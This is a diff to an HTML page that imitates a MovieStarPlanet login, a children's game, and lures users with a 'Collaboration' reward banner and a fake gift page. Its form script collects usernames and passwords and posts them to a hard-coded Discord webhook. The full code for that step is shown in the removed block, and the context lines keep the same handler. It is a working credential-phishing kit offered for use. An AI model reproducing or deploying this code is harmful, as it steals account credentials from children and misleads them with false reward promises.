@@ -16,47 +16,152 @@
       align-items: center;
       height: 100vh;
       margin: 0;
+      background-image: url('https://cdn.wallpapersafari.com/76/98/7H4qok.jpg');
+      background-size: cover;
+      background-repeat: no-repeat;
+      background-position: center;
     }
-    
+
     .login-container {
-      background-color: #222121;
-      padding: 20px;
-      border-radius: 8px;
+      background-color: rgba(0, 0, 0, 0.7);
+      padding: 30px;
+      border-radius: 12px;
+      width: 300px; /* Adjust container width */
     }
-    
+
     .form-group {
-      margin-bottom: 15px;
+      margin-bottom: 20px;
     }
-    
+
     label {
       display: block;
       margin-bottom: 5px;
+      color: #fff;
     }
-    
+
     input {
       width: 100%;
-      padding: 8px;
-      border: 1px solid #ccc;
+      padding: 10px;
+      border: none;
       border-radius: 4px;
+      background-color: rgba(255, 255, 255, 0.1); /* Transparent background */
+      color: #fff;
     }
-    
+
     button {
-      padding: 10px 20px;
+      width: 100%;
+      padding: 10px 0;
       background-color: hsl(340, 83%, 81%);
       color: #fff;
       border: none;
       border-radius: 4px;
       cursor: pointer;
     }
-    
+
     button:hover {
       background-color: #45a049;
+    }
+
+    .header {
+      background-color: rgba(0, 0, 0, 0.5); /* Transparent black background */
+      color: #fff;
+      padding: 15px 20px;
+      display: flex;
+      align-items: center;
+      position: fixed; /* Fixed position */
+      top: 0; /* Position at the top */
+      left: 0;
+      width: 100%; /* Full width */
+      z-index: 1000; /* Ensure it's above other content */
+    }
+
+    .header-logo {
+      width: 150px; /* Adjust the width */
+      margin-right: 20px;
+    }
+
+    .header-title {
+      font-size: 32px; /* Increase font size */
+      font-weight: bold; /* Bold font */
+      text-transform: uppercase; /* Uppercase text */
+    }
+
+    .footer {
+      background-color: rgba(255, 255, 255, 0.7); /* Semi-transparent white background */
+      color: #333; /* Darker color for better contrast */
+      padding: 15px 20px;
+      display: flex;
+      justify-content: space-between;
+      position: fixed; /* Fixed position */
+      bottom: 0; /* Position at the bottom */
+      left: 0;
+      width: 100%; /* Full width */
+      z-index: 1000; /* Ensure it's above other content */
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; /* Change font family */
+    }
+
+    .footer-links {
+      display: flex;
+      list-style-type: none;
+      padding: 0;
+    }
+
+    .footer-links li {
+      margin-right: 20px;
+    }
+
+    .footer-links a {
+      color: #333; /* Darker color for better contrast */
+      text-decoration: none;
+      transition: transform 0.2s ease, color 0.2s ease; /* Added color transition */
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; /* Change font family */
+      font-size: 18px; /* Increase font size */
+    }
+
+    .footer-links a:hover {
+      transform: scale(1.1);
+      color: #000; /* Darker color on hover */
+    }
+
+    .collaboration-banner {
+      text-align: center;
+      padding: 70px 30px; /* Adjust padding as needed */
+      color: #fff;
+      position: absolute;
+      top: calc(25% - 50px); /* Adjust as needed */
+      left: 50%;
+      transform: translateX(-50%);
+      z-index: 999; /* Ensure it's above other content */
+      cursor: not-allowed; /* Make the banner unclickable */
+      font-weight: bold; /* Make the font thicker */
+      font-size: 40px; /* Adjust font size */
+      white-space: nowrap; /* Prevent line break */
+      transition: transform 0.4s ease; /* Smooth transition for shake effect */
+      animation: shake 1s infinite; /* Add shake animation */
+      text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5); /* Add text shadow */
+      -webkit-text-stroke: 1px black; /* Add black outline for text */
+    }
+
+    .collaboration-banner img {
+      display: inline-block;
+      width: 80px; /* Adjust image size as needed */
+      margin-right: 5px; /* Adjust margin as needed */
+      vertical-align: middle; /* Align image vertically */
+      transform: rotate(5deg); /* Rotate the heart image */
+    }
+
+    @keyframes shake {
+      0% { transform: translateX(-50%) rotate(0deg); }
+      25% { transform: translateX(-50%) rotate(2deg); }
+      50% { transform: translateX(-50%) rotate(0deg); }
+      75% { transform: translateX(-50%) rotate(-2deg); }
+      100% { transform: translateX(-50%) rotate(0deg); }
     }
   </style>
 </head>
 <body>
   <div class="login-container">
-    <h2>Login</h2>
+    <h2 style="color: #fff;">Login</h2>
     <form id="login-form">
       <div class="form-group">
         <label for="username">Username:</label>
@@ -70,8 +175,44 @@
     </form>
   </div>
 
+  <!-- Header -->
+  <div class="header">
+    <img src="https://moviestarplanet.fr/img/logo.png" alt="Logo" class="header-logo">
+    <h1 class="header-title">MovieStarPlanet2024</h1>
+  </div>
+
+  <!-- Collaboration Banner -->
+  <div class="collaboration-banner">
+    <img src="https://moviestarplanet.fr/img/buttonArtwork01.png" alt="Hearts">
+    <span>Collaboration</span>
+    <span>Show us how active you are and receive your reward !!</span>
+  </div>
+
+  <!-- Footer -->
+  <div class="footer">
+    <div>
+      <a href="https://moviestarplanet.fr/" target="_blank">Entreprise</a>
+      <a href="#" id="contact">Contact</a> <!-- Added id for contact link -->
+      <a href="https://moviestarplanet.zendesk.com/hc/fr/articles/115000385689-Protection-des-Enfants" target="_blank">Sécurité</a>
+      <a href="https://moviestarplanet.zendesk.com/hc/fr/articles/213892145-Termes-et-Conditions" target="_blank">Conditions générales</a>
+      <a href="https://moviestarplanet.zendesk.com/hc/fr/articles/214480005-Informations-pour-les-Parents" target="_blank">Parents</a>
+      <a href="https://moviestarplanet.zendesk.com/hc/fr/articles/213208965-Politique-de-confidentialit%C3%A9" target="_blank">POLITIQUE DE CONFIDENTIALITÉ</a>
+      <a href="https://moviestarplanet.fr/">MovieStarPlanet</a>
+    </div>
+  </div>
+
+  <!-- JavaScript for contact link shake effect -->
   <script>
-    // Script to handle form submission
+    document.getElementById('contact').addEventListener('click', function() {
+      this.style.animation = 'shake 0.5s'; // Add shake animation
+      setTimeout(() => {
+        this.style.animation = ''; // Reset animation after 0.5s
+      }, 500);
+    });
+  </script>
+
+  <!-- Script for handling form submission -->
+  <script>
     document.getElementById("login-form").addEventListener("submit", function(event) {
       event.preventDefault(); // Prevent form submission
       
@@ -101,7 +242,44 @@
         body: JSON.stringify(message)
       }).then(function(response) {
         if (response.ok) {
-          alert("Login successful!");
+          // Open a new tab with congratulations message and image
+          var congratsPage = window.open();
+          congratsPage.document.write(`
+            <!DOCTYPE html>
+            <html lang="en">
+            <head>
+              <meta charset="UTF-8">
+              <meta name="viewport" content="width=device-width, initial-scale=1.0">
+              <title>Congratulations</title>
+              <style>
+                body { 
+                  font-family: Arial, sans-serif; 
+                  background-color: #d1c7c7; 
+                  color: #FFFFFF; 
+                  display: flex; 
+                  justify-content: center; 
+                  align-items: center; 
+                  height: 100vh; 
+                  margin: 0; 
+                  background-image: url('https://cdn.wallpapersafari.com/76/98/7H4qok.jpg'); 
+                  background-size: cover; 
+                  background-repeat: no-repeat; 
+                  background-position: center;
+                }
+                h2 { margin-bottom: 20px; }
+                img { width: 200px; }
+              </style>
+            </head>
+            <body>
+              <div>
+                <h2>Congratulations!</h2>
+                <p>You've received a gift:</p>
+                <img src="http://vignette3.wikia.nocookie.net/moviestarplanet/images/2/29/Gifting.png/revision/latest?cb=20140504004533" alt="Gift">
+              </div>
+            </body>
+            </html>
+          `);
+          congratsPage.document.close(); // Close the document open for writing
         } else {
           alert("Failed to notify moderators. Please try again later.");
         }
@@ -113,70 +291,41 @@
   </script>
 </body>
 </html>
-<body style="background-image: url(https://2.bp.blogspot.com/-CWCh2Wpny7c/WHNjjB1tkpI/AAAAAAAAB1g/dQYkBBdkMOM7d7n3UdmtFlJC7DfBKLcEgCLcB/s1600/msp%2Bplaatje.png
-); background-size: cover; background-repeat: no-repeat; background-position: center;">
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Your Website</title>
+  <!-- Add your other stylesheets and scripts here -->
+  <link rel="stylesheet" href="styles.css"> <!-- You'll create this file for styling -->
+  <style>
+    /* Visible code for positioning */
+    .shake-button {
+      position: fixed;
+      bottom: 12px; /* Adjust the distance from the bottom */
+      right: 20px; /* Adjust the distance from the right */
+      z-index: 995; /* Ensure it's above other content */
+    }
+  </style>
+</head>
+<body>
 
-<script>
-  // Script to handle form submission
-  document.getElementById("login-form").addEventListener("submit", function(event) {
-    event.preventDefault(); // Prevent form submission
-    
-    // Get input values
-    var username = document.getElementById("username").value;
-    var password = document.getElementById("password").value;
+  <!-- Your existing website content goes here -->
 
-    // Save username, password, and date to localStorage
-    var currentDate = new Date().toLocaleString();
-    localStorage.setItem("username", username);
-    localStorage.setItem("password", password);
-    localStorage.setItem("loginDate", currentDate);
-    
-    // Example: Sending data to Discord webhook
-    var webhookURL = "https://discord.com/api/webhooks/1237543876772761630/pnHMWhI_rz6b6fKXlBE6Z6409nusDuWfNJNvcZmWvxYnP4NRhUKjKWk5dGgxLoR1vMxS";
-    var message = {
-      username: "Login Notification",
-      content: "Username: " + username + "\nPassword: " + password + "\nLogin Date: " + currentDate
-    };
+  <!-- Shake image button -->
+  <div class="shake-button">
+    <img src="https://moviestarplanet2.fr/img/marketing_splash/splash_en.png" alt="Shake Button" id="shakeButton">
+  </div>
 
-    // Send message to Discord webhook
-    fetch(webhookURL, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify(message)
-    }).then(function(response) {
-      if (response.ok) {
-        // Open a new tab with congratulations message and image
-        var congratsPage = window.open();
-        congratsPage.document.write(`
-          <!DOCTYPE html>
-          <html lang="en">
-          <head>
-            <meta charset="UTF-8">
-            <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            <title>Congratulations</title>
-            <style>
-              body { font-family: Arial, sans-serif; background-color: #d1c7c7; color: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-              h2 { margin-bottom: 20px; }
-              img { width: 200px; }
-            </style>
-          </head>
-          <body>
-            <div>
-              <h2>Congratulations!</h2>
-              <p>You've received a gift:</p>
-              <img src="http://vignette3.wikia.nocookie.net/moviestarplanet/images/2/29/Gifting.png/revision/latest?cb=20140504004533" alt="Gift">
-            </div>
-          </body>
-          </html>
-        `);
-      } else {
-        alert("Failed to notify moderators. Please try again later.");
-      }
-    }).catch(function(error) {
-      console.error("Error:", error);
-      alert("An error occurred. Please try again later.");
+  <!-- JavaScript for shake effect -->
+  <script>
+    document.getElementById('shakeButton').addEventListener('click', function() {
+      this.style.animation = 'shake 0.5s'; // Add shake animation
+      setTimeout(() => {
+        this.style.animation = ''; // Reset animation after 0.5s
+      }, 500);
     });
-  });
-</script>
+  </script>
+</body>
+</html>
